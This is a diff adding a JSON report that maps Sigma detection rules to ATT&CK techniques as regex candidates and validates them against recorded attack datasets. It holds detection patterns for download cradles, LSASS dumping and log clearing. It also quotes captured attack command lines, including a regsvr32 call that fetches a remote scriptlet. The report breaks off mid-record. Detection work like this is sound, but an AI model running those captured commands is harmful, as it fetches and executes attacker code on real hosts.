@@ -1,0 +1,486 @@
+{
+  "checkpoint": "Card 5 Part 1 roadmap step 1 only",
+  "projection_notes": [
+    "No candidate in this report has been added to backend/log_analysis/mappings.py.",
+    "pySigma field predicates are projected onto the current flattened raw-event model; field-aware matching remains Layer 2 work.",
+    "Windows path separators match one-or-more literal backslashes so both plain logs and JSON-escaped logs are accepted.",
+    "Genuinely multi-technique and untagged rules retain compiled regexes in needs_review but emit no MappingRule candidate."
+  ],
+  "pysigma_version": "1.4.0",
+  "sigma_commit": "65b39fa48afc2739ed01df03ef61c68be995bb36",
+  "security_datasets_commit": "d9d40ef123d2c87d5d3df28c96bcab4f0faccc87",
+  "sample_rule_count": 16,
+  "mapping_candidate_count": 10,
+  "needs_review_count": 6,
+  "mapping_candidates": [
+    {
+      "source": "proc_creation_win_auditpol_susp_execution.yml",
+      "title": "Audit Policy Tampering Via Auditpol",
+      "rule_id": "0a13e132-651d-11eb-ae93-0242ac130002",
+      "platform": "windows",
+      "confidence": "high",
+      "technique_id": "T1685.001",
+      "technique_name": "Disable or Modify Windows Event Log",
+      "pattern": "\\A(?:(?=[\\s\\S]*(?:\\\\+auditpol\\.exe))|(?=[\\s\\S]*(?:AUDITPOL\\.EXE)))(?:(?=[\\s\\S]*(?:disable))|(?=[\\s\\S]*(?:clear))|(?=[\\s\\S]*(?:remove))|(?=[\\s\\S]*(?:restore)))[\\s\\S]*\\Z",
+      "tag_resolution": {
+        "status": "mapping_candidate",
+        "original_tags": [
+          "T1685.001"
+        ],
+        "resolved_tags": [
+          "T1685.001"
+        ],
+        "explanation": "Single ATT&CK technique tag."
+      },
+      "python": "_rule('\\\\A(?:(?=[\\\\s\\\\S]*(?:\\\\\\\\+auditpol\\\\.exe))|(?=[\\\\s\\\\S]*(?:AUDITPOL\\\\.EXE)))(?:(?=[\\\\s\\\\S]*(?:disable))|(?=[\\\\s\\\\S]*(?:clear))|(?=[\\\\s\\\\S]*(?:remove))|(?=[\\\\s\\\\S]*(?:restore)))[\\\\s\\\\S]*\\\\Z', 'Disable or Modify Windows Event Log', 'windows', 'high',\n      'Audit Policy Tampering Via Auditpol (Sigma-sourced).',\n      'Sigma: proc_creation_win_auditpol_susp_execution.yml'),"
+    },
+    {
+      "source": "proc_creation_win_esentutl_params.yml",
+      "title": "Esentutl Gather Credentials",
+      "rule_id": "7df1713a-1a5b-4a4b-a071-dc83b144a101",
+      "platform": "windows",
+      "confidence": "medium",
+      "technique_id": "T1003.003",
+      "technique_name": "NTDS",
+      "pattern": "\\A(?=[\\s\\S]*(?:esentutl))(?=[\\s\\S]*(?:\\ /p))[\\s\\S]*\\Z",
+      "tag_resolution": {
+        "status": "mapping_candidate",
+        "original_tags": [
+          "T1003",
+          "T1003.003"
+        ],
+        "resolved_tags": [
+          "T1003.003"
+        ],
+        "explanation": "Parent/sub-technique overlap auto-resolved to the more specific sub-technique."
+      },
+      "python": "_rule('\\\\A(?=[\\\\s\\\\S]*(?:esentutl))(?=[\\\\s\\\\S]*(?:\\\\ /p))[\\\\s\\\\S]*\\\\Z', 'NTDS', 'windows', 'medium',\n      'Esentutl Gather Credentials (Sigma-sourced).',\n      'Sigma: proc_creation_win_esentutl_params.yml'),"
+    },
+    {
+      "source": "proc_creation_win_mshta_javascript.yml",
+      "title": "Suspicious JavaScript Execution Via Mshta.EXE",
+      "rule_id": "67f113fa-e23d-4271-befa-30113b3e08b1",
+      "platform": "windows",
+      "confidence": "high",
+      "technique_id": "T1218.005",
+      "technique_name": "Mshta",
+      "pattern": "\\A(?:(?=[\\s\\S]*(?:\\\\+mshta\\.exe))|(?=[\\s\\S]*(?:MSHTA\\.EXE)))(?=[\\s\\S]*(?:javascript))[\\s\\S]*\\Z",
+      "tag_resolution": {
+        "status": "mapping_candidate",
+        "original_tags": [
+          "T1218.005"
+        ],
+        "resolved_tags": [
+          "T1218.005"
+        ],
+        "explanation": "Single ATT&CK technique tag."
+      },
+      "python": "_rule('\\\\A(?:(?=[\\\\s\\\\S]*(?:\\\\\\\\+mshta\\\\.exe))|(?=[\\\\s\\\\S]*(?:MSHTA\\\\.EXE)))(?=[\\\\s\\\\S]*(?:javascript))[\\\\s\\\\S]*\\\\Z', 'Mshta', 'windows', 'high',\n      'Suspicious JavaScript Execution Via Mshta.EXE (Sigma-sourced).',\n      'Sigma: proc_creation_win_mshta_javascript.yml'),"
+    },
+    {
+      "source": "proc_creation_win_netsh_fw_add_rule.yml",
+      "title": "New Firewall Rule Added Via Netsh.EXE",
+      "rule_id": "cd5cfd80-aa5f-44c0-9c20-108c4ae12e3c",
+      "platform": "windows",
+      "confidence": "medium",
+      "technique_id": "T1686.003",
+      "technique_name": "Windows Host Firewall",
+      "pattern": "\\A(?:(?=[\\s\\S]*(?:\\\\+netsh\\.exe))|(?=[\\s\\S]*(?:netsh\\.exe)))(?=[\\s\\S]*(?:\\ firewall\\ ))(?=[\\s\\S]*(?:\\ add\\ ))(?!(?:(?=[\\s\\S]*(?:advfirewall\\ firewall\\ add\\ rule\\ name=Dropbox\\ dir=in\\ action=allow\\ \"program=[\\s\\S]:\\\\+Program\\ Files\\ \\(x86\\)\\\\+Dropbox\\\\+Client\\\\+Dropbox\\.exe\"\\ enable=yes\\ profile=Any))|(?=[\\s\\S]*(?:advfirewall\\ firewall\\ add\\ rule\\ name=Dropbox\\ dir=in\\ action=allow\\ \"program=[\\s\\S]:\\\\+Program\\ Files\\\\+Dropbox\\\\+Client\\\\+Dropbox\\.exe\"\\ enable=yes\\ profile=Any))))[\\s\\S]*\\Z",
+      "tag_resolution": {
+        "status": "mapping_candidate",
+        "original_tags": [
+          "T1686.003"
+        ],
+        "resolved_tags": [
+          "T1686.003"
+        ],
+        "explanation": "Single ATT&CK technique tag."
+      },
+      "python": "_rule('\\\\A(?:(?=[\\\\s\\\\S]*(?:\\\\\\\\+netsh\\\\.exe))|(?=[\\\\s\\\\S]*(?:netsh\\\\.exe)))(?=[\\\\s\\\\S]*(?:\\\\ firewall\\\\ ))(?=[\\\\s\\\\S]*(?:\\\\ add\\\\ ))(?!(?:(?=[\\\\s\\\\S]*(?:advfirewall\\\\ firewall\\\\ add\\\\ rule\\\\ name=Dropbox\\\\ dir=in\\\\ action=allow\\\\ \"program=[\\\\s\\\\S]:\\\\\\\\+Program\\\\ Files\\\\ \\\\(x86\\\\)\\\\\\\\+Dropbox\\\\\\\\+Client\\\\\\\\+Dropbox\\\\.exe\"\\\\ enable=yes\\\\ profile=Any))|(?=[\\\\s\\\\S]*(?:advfirewall\\\\ firewall\\\\ add\\\\ rule\\\\ name=Dropbox\\\\ dir=in\\\\ action=allow\\\\ \"program=[\\\\s\\\\S]:\\\\\\\\+Program\\\\ Files\\\\\\\\+Dropbox\\\\\\\\+Client\\\\\\\\+Dropbox\\\\.exe\"\\\\ enable=yes\\\\ profile=Any))))[\\\\s\\\\S]*\\\\Z', 'Windows Host Firewall', 'windows', 'medium',\n      'New Firewall Rule Added Via Netsh.EXE (Sigma-sourced).',\n      'Sigma: proc_creation_win_netsh_fw_add_rule.yml'),"
+    },
+    {
+      "source": "proc_creation_win_ntdsutil_usage.yml",
+      "title": "Invocation of Active Directory Diagnostic Tool (ntdsutil.exe)",
+      "rule_id": "2afafd61-6aae-4df4-baed-139fa1f4c345",
+      "platform": "windows",
+      "confidence": "medium",
+      "technique_id": "T1003.003",
+      "technique_name": "NTDS",
+      "pattern": "\\A(?=[\\s\\S]*(?:\\\\+ntdsutil\\.exe))[\\s\\S]*\\Z",
+      "tag_resolution": {
+        "status": "mapping_candidate",
+        "original_tags": [
+          "T1003.003"
+        ],
+        "resolved_tags": [
+          "T1003.003"
+        ],
+        "explanation": "Single ATT&CK technique tag."
+      },
+      "python": "_rule('\\\\A(?=[\\\\s\\\\S]*(?:\\\\\\\\+ntdsutil\\\\.exe))[\\\\s\\\\S]*\\\\Z', 'NTDS', 'windows', 'medium',\n      'Invocation of Active Directory Diagnostic Tool (ntdsutil.exe) (Sigma-sourced).',\n      'Sigma: proc_creation_win_ntdsutil_usage.yml'),"
+    },
+    {
+      "source": "proc_creation_win_powershell_download_iex.yml",
+      "title": "PowerShell Download and Execution Cradles",
+      "rule_id": "85b0b087-eddf-4a2b-b033-d771fa2b9775",
+      "platform": "windows",
+      "confidence": "high",
+      "technique_id": "T1059",
+      "technique_name": "Command and Scripting Interpreter",
+      "pattern": "\\A(?:(?=[\\s\\S]*(?:\\.DownloadString\\())|(?=[\\s\\S]*(?:\\.DownloadFile\\())|(?=[\\s\\S]*(?:Invoke\\-WebRequest\\ ))|(?=[\\s\\S]*(?:iwr\\ ))|(?=[\\s\\S]*(?:Invoke\\-RestMethod\\ ))|(?=[\\s\\S]*(?:irm\\ )))(?:(?=[\\s\\S]*(?:;iex\\ \\$))|(?=[\\s\\S]*(?:\\|\\ IEX))|(?=[\\s\\S]*(?:\\|IEX\\ ))|(?=[\\s\\S]*(?:I`E`X))|(?=[\\s\\S]*(?:I`EX))|(?=[\\s\\S]*(?:IE`X))|(?=[\\s\\S]*(?:iex\\ ))|(?=[\\s\\S]*(?:IEX\\ \\())|(?=[\\s\\S]*(?:IEX\\())|(?=[\\s\\S]*(?:Invoke\\-Expression)))[\\s\\S]*\\Z",
+      "tag_resolution": {
+        "status": "mapping_candidate",
+        "original_tags": [
+          "T1059"
+        ],
+        "resolved_tags": [
+          "T1059"
+        ],
+        "explanation": "Single ATT&CK technique tag."
+      },
+      "python": "_rule('\\\\A(?:(?=[\\\\s\\\\S]*(?:\\\\.DownloadString\\\\())|(?=[\\\\s\\\\S]*(?:\\\\.DownloadFile\\\\())|(?=[\\\\s\\\\S]*(?:Invoke\\\\-WebRequest\\\\ ))|(?=[\\\\s\\\\S]*(?:iwr\\\\ ))|(?=[\\\\s\\\\S]*(?:Invoke\\\\-RestMethod\\\\ ))|(?=[\\\\s\\\\S]*(?:irm\\\\ )))(?:(?=[\\\\s\\\\S]*(?:;iex\\\\ \\\\$))|(?=[\\\\s\\\\S]*(?:\\\\|\\\\ IEX))|(?=[\\\\s\\\\S]*(?:\\\\|IEX\\\\ ))|(?=[\\\\s\\\\S]*(?:I`E`X))|(?=[\\\\s\\\\S]*(?:I`EX))|(?=[\\\\s\\\\S]*(?:IE`X))|(?=[\\\\s\\\\S]*(?:iex\\\\ ))|(?=[\\\\s\\\\S]*(?:IEX\\\\ \\\\())|(?=[\\\\s\\\\S]*(?:IEX\\\\())|(?=[\\\\s\\\\S]*(?:Invoke\\\\-Expression)))[\\\\s\\\\S]*\\\\Z', 'Command and Scripting Interpreter', 'windows', 'high',\n      'PowerShell Download and Execution Cradles (Sigma-sourced).',\n      'Sigma: proc_creation_win_powershell_download_iex.yml'),"
+    },
+    {
+      "source": "proc_creation_win_registry_logon_script.yml",
+      "title": "Potential Persistence Via Logon Scripts - CommandLine",
+      "rule_id": "21d856f9-9281-4ded-9377-51a1a6e2a432",
+      "platform": "windows",
+      "confidence": "high",
+      "technique_id": "T1037.001",
+      "technique_name": "Logon Script (Windows)",
+      "pattern": "\\A(?=[\\s\\S]*(?:UserInitMprLogonScript))[\\s\\S]*\\Z",
+      "tag_resolution": {
+        "status": "mapping_candidate",
+        "original_tags": [
+          "T1037.001"
+        ],
+        "resolved_tags": [
+          "T1037.001"
+        ],
+        "explanation": "Single ATT&CK technique tag."
+      },
+      "python": "_rule('\\\\A(?=[\\\\s\\\\S]*(?:UserInitMprLogonScript))[\\\\s\\\\S]*\\\\Z', 'Logon Script (Windows)', 'windows', 'high',\n      'Potential Persistence Via Logon Scripts - CommandLine (Sigma-sourced).',\n      'Sigma: proc_creation_win_registry_logon_script.yml'),"
+    },
+    {
+      "source": "proc_creation_win_regsvr32_network_pattern.yml",
+      "title": "Potentially Suspicious Regsvr32 HTTP/FTP Pattern",
+      "rule_id": "867356ee-9352-41c9-a8f2-1be690d78216",
+      "platform": "windows",
+      "confidence": "medium",
+      "technique_id": "T1218.010",
+      "technique_name": "Regsvr32",
+      "pattern": "\\A(?:(?=[\\s\\S]*(?:\\\\+regsvr32\\.exe))|(?=[\\s\\S]*(?:REGSVR32\\.EXE)))(?:(?=[\\s\\S]*(?:\\ /i))|(?=[\\s\\S]*(?:\\ \\-i)))(?:(?=[\\s\\S]*(?:ftp))|(?=[\\s\\S]*(?:http)))[\\s\\S]*\\Z",
+      "tag_resolution": {
+        "status": "mapping_candidate",
+        "original_tags": [
+          "T1218.010"
+        ],
+        "resolved_tags": [
+          "T1218.010"
+        ],
+        "explanation": "Single ATT&CK technique tag."
+      },
+      "python": "_rule('\\\\A(?:(?=[\\\\s\\\\S]*(?:\\\\\\\\+regsvr32\\\\.exe))|(?=[\\\\s\\\\S]*(?:REGSVR32\\\\.EXE)))(?:(?=[\\\\s\\\\S]*(?:\\\\ /i))|(?=[\\\\s\\\\S]*(?:\\\\ \\\\-i)))(?:(?=[\\\\s\\\\S]*(?:ftp))|(?=[\\\\s\\\\S]*(?:http)))[\\\\s\\\\S]*\\\\Z', 'Regsvr32', 'windows', 'medium',\n      'Potentially Suspicious Regsvr32 HTTP/FTP Pattern (Sigma-sourced).',\n      'Sigma: proc_creation_win_regsvr32_network_pattern.yml'),"
+    },
+    {
+      "source": "proc_creation_win_schtasks_creation.yml",
+      "title": "Scheduled Task Creation Via Schtasks.EXE",
+      "rule_id": "92626ddd-662c-49e3-ac59-f6535f12d189",
+      "platform": "windows",
+      "confidence": "low",
+      "technique_id": "T1053.005",
+      "technique_name": "Scheduled Task",
+      "pattern": "\\A(?=[\\s\\S]*(?:\\\\+schtasks\\.exe))(?=[\\s\\S]*(?:\\ /create\\ ))(?!(?:(?=[\\s\\S]*(?:AUTHORI))|(?=[\\s\\S]*(?:AUTORI))))(?!(?:(?=[\\s\\S]*(?:C:\\\\+Program\\ Files\\\\+Microsoft\\ Office\\\\+root\\\\+integration\\\\+integrator\\.exe))|(?=[\\s\\S]*(?:C:\\\\+Program\\ Files\\ \\(x86\\)\\\\+Microsoft\\ Office\\\\+root\\\\+integration\\\\+integrator\\.exe)))(?:(?=[\\s\\S]*(?:C:\\\\+Windows\\\\+System32\\\\+schtasks\\.exe))|(?=[\\s\\S]*(?:C:\\\\+Windows\\\\+SysWOW64\\\\+schtasks\\.exe)))(?=[\\s\\S]*(?:Microsoft\\\\+Office\\\\+Office\\ Performance\\ Monitor)))[\\s\\S]*\\Z",
+      "tag_resolution": {
+        "status": "mapping_candidate",
+        "original_tags": [
+          "T1053.005"
+        ],
+        "resolved_tags": [
+          "T1053.005"
+        ],
+        "explanation": "Single ATT&CK technique tag."
+      },
+      "python": "_rule('\\\\A(?=[\\\\s\\\\S]*(?:\\\\\\\\+schtasks\\\\.exe))(?=[\\\\s\\\\S]*(?:\\\\ /create\\\\ ))(?!(?:(?=[\\\\s\\\\S]*(?:AUTHORI))|(?=[\\\\s\\\\S]*(?:AUTORI))))(?!(?:(?=[\\\\s\\\\S]*(?:C:\\\\\\\\+Program\\\\ Files\\\\\\\\+Microsoft\\\\ Office\\\\\\\\+root\\\\\\\\+integration\\\\\\\\+integrator\\\\.exe))|(?=[\\\\s\\\\S]*(?:C:\\\\\\\\+Program\\\\ Files\\\\ \\\\(x86\\\\)\\\\\\\\+Microsoft\\\\ Office\\\\\\\\+root\\\\\\\\+integration\\\\\\\\+integrator\\\\.exe)))(?:(?=[\\\\s\\\\S]*(?:C:\\\\\\\\+Windows\\\\\\\\+System32\\\\\\\\+schtasks\\\\.exe))|(?=[\\\\s\\\\S]*(?:C:\\\\\\\\+Windows\\\\\\\\+SysWOW64\\\\\\\\+schtasks\\\\.exe)))(?=[\\\\s\\\\S]*(?:Microsoft\\\\\\\\+Office\\\\\\\\+Office\\\\ Performance\\\\ Monitor)))[\\\\s\\\\S]*\\\\Z', 'Scheduled Task', 'windows', 'low',\n      'Scheduled Task Creation Via Schtasks.EXE (Sigma-sourced).',\n      'Sigma: proc_creation_win_schtasks_creation.yml'),"
+    },
+    {
+      "source": "proc_creation_win_wmic_susp_process_creation.yml",
+      "title": "Suspicious Process Created Via Wmic.EXE",
+      "rule_id": "3c89a1e8-0fba-449e-8f1b-8409d6267ec8",
+      "platform": "windows",
+      "confidence": "high",
+      "technique_id": "T1047",
+      "technique_name": "Windows Management Instrumentation",
+      "pattern": "\\A(?=[\\s\\S]*(?:process\\ ))(?=[\\s\\S]*(?:call\\ ))(?=[\\s\\S]*(?:create\\ ))(?:(?=[\\s\\S]*(?:rundll32))|(?=[\\s\\S]*(?:bitsadmin))|(?=[\\s\\S]*(?:regsvr32))|(?=[\\s\\S]*(?:cmd\\.exe\\ /c\\ ))|(?=[\\s\\S]*(?:cmd\\.exe\\ /k\\ ))|(?=[\\s\\S]*(?:cmd\\.exe\\ /r\\ ))|(?=[\\s\\S]*(?:cmd\\ /c\\ ))|(?=[\\s\\S]*(?:cmd\\ /k\\ ))|(?=[\\s\\S]*(?:cmd\\ /r\\ ))|(?=[\\s\\S]*(?:powershell))|(?=[\\s\\S]*(?:pwsh))|(?=[\\s\\S]*(?:certutil))|(?=[\\s\\S]*(?:cscript))|(?=[\\s\\S]*(?:wscript))|(?=[\\s\\S]*(?:mshta))|(?=[\\s\\S]*(?:\\\\+Users\\\\+Public\\\\+))|(?=[\\s\\S]*(?:\\\\+Windows\\\\+Temp\\\\+))|(?=[\\s\\S]*(?:\\\\+AppData\\\\+Local\\\\+))|(?=[\\s\\S]*(?:%temp%))|(?=[\\s\\S]*(?:%tmp%))|(?=[\\s\\S]*(?:%ProgramData%))|(?=[\\s\\S]*(?:%appdata%))|(?=[\\s\\S]*(?:%comspec%))|(?=[\\s\\S]*(?:%localappdata%)))[\\s\\S]*\\Z",
+      "tag_resolution": {
+        "status": "mapping_candidate",
+        "original_tags": [
+          "T1047"
+        ],
+        "resolved_tags": [
+          "T1047"
+        ],
+        "explanation": "Single ATT&CK technique tag."
+      },
+      "python": "_rule('\\\\A(?=[\\\\s\\\\S]*(?:process\\\\ ))(?=[\\\\s\\\\S]*(?:call\\\\ ))(?=[\\\\s\\\\S]*(?:create\\\\ ))(?:(?=[\\\\s\\\\S]*(?:rundll32))|(?=[\\\\s\\\\S]*(?:bitsadmin))|(?=[\\\\s\\\\S]*(?:regsvr32))|(?=[\\\\s\\\\S]*(?:cmd\\\\.exe\\\\ /c\\\\ ))|(?=[\\\\s\\\\S]*(?:cmd\\\\.exe\\\\ /k\\\\ ))|(?=[\\\\s\\\\S]*(?:cmd\\\\.exe\\\\ /r\\\\ ))|(?=[\\\\s\\\\S]*(?:cmd\\\\ /c\\\\ ))|(?=[\\\\s\\\\S]*(?:cmd\\\\ /k\\\\ ))|(?=[\\\\s\\\\S]*(?:cmd\\\\ /r\\\\ ))|(?=[\\\\s\\\\S]*(?:powershell))|(?=[\\\\s\\\\S]*(?:pwsh))|(?=[\\\\s\\\\S]*(?:certutil))|(?=[\\\\s\\\\S]*(?:cscript))|(?=[\\\\s\\\\S]*(?:wscript))|(?=[\\\\s\\\\S]*(?:mshta))|(?=[\\\\s\\\\S]*(?:\\\\\\\\+Users\\\\\\\\+Public\\\\\\\\+))|(?=[\\\\s\\\\S]*(?:\\\\\\\\+Windows\\\\\\\\+Temp\\\\\\\\+))|(?=[\\\\s\\\\S]*(?:\\\\\\\\+AppData\\\\\\\\+Local\\\\\\\\+))|(?=[\\\\s\\\\S]*(?:%temp%))|(?=[\\\\s\\\\S]*(?:%tmp%))|(?=[\\\\s\\\\S]*(?:%ProgramData%))|(?=[\\\\s\\\\S]*(?:%appdata%))|(?=[\\\\s\\\\S]*(?:%comspec%))|(?=[\\\\s\\\\S]*(?:%localappdata%)))[\\\\s\\\\S]*\\\\Z', 'Windows Management Instrumentation', 'windows', 'high',\n      'Suspicious Process Created Via Wmic.EXE (Sigma-sourced).',\n      'Sigma: proc_creation_win_wmic_susp_process_creation.yml'),"
+    }
+  ],
+  "needs_review": [
+    {
+      "source": "proc_creation_win_bitsadmin_download.yml",
+      "title": "File Download Via Bitsadmin",
+      "rule_id": "d059842b-6b9d-4ed1-b5c3-5b89143c6ede",
+      "platform": "windows",
+      "confidence": "medium",
+      "pattern": "\\A(?:(?=[\\s\\S]*(?:\\\\+bitsadmin\\.exe))|(?=[\\s\\S]*(?:bitsadmin\\.exe)))(?:(?=[\\s\\S]*(?:\\ /transfer\\ ))|(?:(?=[\\s\\S]*(?:\\ /create\\ ))|(?=[\\s\\S]*(?:\\ /addfile\\ )))(?=[\\s\\S]*(?:http)))[\\s\\S]*\\Z",
+      "original_technique_tags": [
+        "T1036.003",
+        "T1105",
+        "T1197"
+      ],
+      "candidate_techniques_after_parent_resolution": [
+        {
+          "technique_id": "T1036.003",
+          "technique_name": "Rename Legitimate Utilities"
+        },
+        {
+          "technique_id": "T1105",
+          "technique_name": "Ingress Tool Transfer"
+        },
+        {
+          "technique_id": "T1197",
+          "technique_name": "BITS Jobs"
+        }
+      ],
+      "review_reason": "Multiple distinct ATT&CK techniques remain after removing redundant parents; the whole-rule regex was not assigned to any one technique."
+    },
+    {
+      "source": "proc_creation_win_instalutil_no_log_execution.yml",
+      "title": "Suspicious Execution of InstallUtil Without Log",
+      "rule_id": "d042284c-a296-4988-9be5-f424fadcc28c",
+      "platform": "windows",
+      "confidence": "medium",
+      "pattern": "\\A(?=[\\s\\S]*(?:\\\\+InstallUtil\\.exe))(?=[\\s\\S]*(?:Microsoft\\.NET\\\\+Framework))(?=[\\s\\S]*(?:/logfile=\\ ))(?=[\\s\\S]*(?:/LogToConsole=false))[\\s\\S]*\\Z",
+      "original_technique_tags": [],
+      "candidate_techniques_after_parent_resolution": [],
+      "review_reason": "Sigma rule has no ATT&CK technique tag."
+    },
+    {
+      "source": "proc_creation_win_ping_hex_ip.yml",
+      "title": "Ping Hex IP",
+      "rule_id": "1a0d4aba-7668-4365-9ce4-6d79ab088dfd",
+      "platform": "windows",
+      "confidence": "high",
+      "pattern": "\\A(?=[\\s\\S]*(?:\\\\+ping\\.exe))(?=[\\s\\S]*(?:(?:0x[a-fA-F0-9]{8})))[\\s\\S]*\\Z",
+      "original_technique_tags": [
+        "T1027",
+        "T1140"
+      ],
+      "candidate_techniques_after_parent_resolution": [
+        {
+          "technique_id": "T1027",
+          "technique_name": "Obfuscated Files or Information"
+        },
+        {
+          "technique_id": "T1140",
+          "technique_name": "Deobfuscate/Decode Files or Information"
+        }
+      ],
+      "review_reason": "Multiple distinct ATT&CK techniques remain after removing redundant parents; the whole-rule regex was not assigned to any one technique."
+    },
+    {
+      "source": "proc_creation_win_rundll32_process_dump_via_comsvcs.yml",
+      "title": "Process Memory Dump Via Comsvcs.DLL",
+      "rule_id": "646ea171-dded-4578-8a4d-65e9822892e3",
+      "platform": "windows",
+      "confidence": "high",
+      "pattern": "\\A(?:(?:(?=[\\s\\S]*(?:\\\\+rundll32\\.exe))|(?=[\\s\\S]*(?:RUNDLL32\\.EXE))|(?=[\\s\\S]*(?:rundll32)))(?=[\\s\\S]*(?:comsvcs))(?=[\\s\\S]*(?:full))(?:(?=[\\s\\S]*(?:\\#\\-))|(?=[\\s\\S]*(?:\\#\\+))|(?=[\\s\\S]*(?:\\#24))|(?=[\\s\\S]*(?:24\\ ))|(?=[\\s\\S]*(?:MiniDump))|(?=[\\s\\S]*(?:\\#65560)))|(?=[\\s\\S]*(?:24))(?=[\\s\\S]*(?:comsvcs))(?=[\\s\\S]*(?:full))(?:(?=[\\s\\S]*(?:\\ \\#))|(?=[\\s\\S]*(?:,\\#))|(?=[\\s\\S]*(?:,\\ \\#))|(?=[\\s\\S]*(?:\"\\#))))[\\s\\S]*\\Z",
+      "original_technique_tags": [
+        "T1003.001",
+        "T1036"
+      ],
+      "candidate_techniques_after_parent_resolution": [
+        {
+          "technique_id": "T1003.001",
+          "technique_name": "LSASS Memory"
+        },
+        {
+          "technique_id": "T1036",
+          "technique_name": "Masquerading"
+        }
+      ],
+      "review_reason": "Multiple distinct ATT&CK techniques remain after removing redundant parents; the whole-rule regex was not assigned to any one technique."
+    },
+    {
+      "source": "proc_creation_win_susp_eventlog_clear.yml",
+      "title": "Suspicious Eventlog Clearing or Configuration Change Activity",
+      "rule_id": "cc36992a-4671-4f21-a91d-6c2b72a2edf5",
+      "platform": "windows",
+      "confidence": "high",
+      "pattern": "\\A(?:(?:(?=[\\s\\S]*(?:\\\\+wevtutil\\.exe))|(?=[\\s\\S]*(?:wevtutil\\.exe)))(?:(?=[\\s\\S]*(?:clear\\-log\\ ))|(?=[\\s\\S]*(?:\\ cl\\ ))|(?=[\\s\\S]*(?:set\\-log\\ ))|(?=[\\s\\S]*(?:\\ sl\\ ))|(?=[\\s\\S]*(?:lfn:)))|(?:(?=[\\s\\S]*(?:\\\\+powershell\\.exe))|(?=[\\s\\S]*(?:\\\\+powershell_ise\\.exe))|(?=[\\s\\S]*(?:\\\\+pwsh\\.exe)))(?:(?:(?=[\\s\\S]*(?:Clear\\-EventLog\\ ))|(?=[\\s\\S]*(?:Remove\\-EventLog\\ ))|(?=[\\s\\S]*(?:Limit\\-EventLog\\ ))|(?=[\\s\\S]*(?:Clear\\-WinEvent\\ )))|(?=[\\s\\S]*(?:Eventing\\.Reader\\.EventLogSession))(?=[\\s\\S]*(?:ClearLog))|(?=[\\s\\S]*(?:Diagnostics\\.EventLog))(?=[\\s\\S]*(?:Clear)))|(?:(?=[\\s\\S]*(?:\\\\+powershell\\.exe))|(?=[\\s\\S]*(?:\\\\+powershell_ise\\.exe))|(?=[\\s\\S]*(?:\\\\+pwsh\\.exe))|(?=[\\s\\S]*(?:\\\\+wmic\\.exe)))(?=[\\s\\S]*(?:ClearEventLog)))(?!(?:(?=[\\s\\S]*(?:C:\\\\+Windows\\\\+SysWOW64\\\\+msiexec\\.exe))|(?=[\\s\\S]*(?:C:\\\\+Windows\\\\+System32\\\\+msiexec\\.exe)))(?=[\\s\\S]*(?:\\ sl\\ )))[\\s\\S]*\\Z",
+      "original_technique_tags": [
+        "T1685.001",
+        "T1685.005"
+      ],
+      "candidate_techniques_after_parent_resolution": [
+        {
+          "technique_id": "T1685.001",
+          "technique_name": "Disable or Modify Windows Event Log"
+        },
+        {
+          "technique_id": "T1685.005",
+          "technique_name": "Clear Windows Event Logs"
+        }
+      ],
+      "review_reason": "Multiple distinct ATT&CK techniques remain after removing redundant parents; the whole-rule regex was not assigned to any one technique."
+    },
+    {
+      "source": "proc_creation_win_uac_bypass_cmstp.yml",
+      "title": "Bypass UAC via CMSTP",
+      "rule_id": "e66779cc-383e-4224-a3a4-267eeb585c40",
+      "platform": "windows",
+      "confidence": "high",
+      "pattern": "\\A(?:(?=[\\s\\S]*(?:\\\\+cmstp\\.exe))|(?=[\\s\\S]*(?:CMSTP\\.EXE)))(?:(?=[\\s\\S]*(?:/s))|(?=[\\s\\S]*(?:\\-s))|(?=[\\s\\S]*(?:/au))|(?=[\\s\\S]*(?:\\-au))|(?=[\\s\\S]*(?:/ni))|(?=[\\s\\S]*(?:\\-ni)))[\\s\\S]*\\Z",
+      "original_technique_tags": [
+        "T1218.003",
+        "T1548.002"
+      ],
+      "candidate_techniques_after_parent_resolution": [
+        {
+          "technique_id": "T1218.003",
+          "technique_name": "CMSTP"
+        },
+        {
+          "technique_id": "T1548.002",
+          "technique_name": "Bypass User Account Control"
+        }
+      ],
+      "review_reason": "Multiple distinct ATT&CK techniques remain after removing redundant parents; the whole-rule regex was not assigned to any one technique."
+    }
+  ],
+  "security_dataset_validation": [
+    {
+      "metadata_id": "SDWIN-200721232741",
+      "dataset_ground_truth_at_pinned_commit": [
+        "T1218.010"
+      ],
+      "source_rule": "proc_creation_win_regsvr32_network_pattern.yml",
+      "rule_mapping_status": "mapping_candidate",
+      "sigma_technique_tags_at_pinned_commit": [
+        "T1218.010"
+      ],
+      "capture": "datasets/atomic/windows/defense_evasion/host/empire_launcher_sct_regsvr32.zip",
+      "matching_event_count": 4,
+      "example": {
+        "EventID": 1,
+        "Image": "C:\\Windows\\System32\\regsvr32.exe",
+        "OriginalFileName": "REGSVR32.EXE",
+        "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "\"C:\\windows\\system32\\regsvr32.exe\" /s /n /u /i:http://10.10.10.5:8444/launcher.sct scrobj.dll",
+        "User": "MORDOR\\pgustavo"
+      },
+      "status": "pass"
+    },
+    {
+      "metadata_id": "SDWIN-191027223020",
+      "dataset_ground_truth_at_pinned_commit": [
+        "T1218.004"
+      ],
+      "source_rule": "proc_creation_win_instalutil_no_log_execution.yml",
+      "rule_mapping_status": "needs_review",
+      "sigma_technique_tags_at_pinned_commit": [],
+      "capture": "datasets/atomic/windows/defense_evasion/host/covenant_installutil.zip",
+      "matching_event_count": 5,
+      "example": {
+        "EventID": 1,
+        "Image": "C:\\Windows\\System32\\cmd.exe",
+        "OriginalFileName": "Cmd.Exe",
+        "ParentImage": "C:\\Users\\pgustavo\\Desktop\\GruntHTTP.exe",
+        "CommandLine": "\"cmd.exe\" /c C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /u c:\\ProgramData\\GruntHTTP.dll",
+        "User": "THESHIRE\\pgustavo"
+      },
+      "status": "pass"
+    },
+    {
+      "metadata_id": "SDWIN-201018195009",
+      "dataset_ground_truth_at_pinned_commit": [
+        "T1003.001"
+      ],
+      "source_rule": "proc_creation_win_rundll32_process_dump_via_comsvcs.yml",
+      "rule_mapping_status": "needs_review",
+      "sigma_technique_tags_at_pinned_commit": [
+        "T1003.001",
+        "T1036"
+      ],
+      "capture": "datasets/atomic/windows/credential_access/host/psh_lsass_memory_dump_comsvcs.zip",
+      "matching_event_count": 2,
+      "example": {
+        "EventID": 4688,
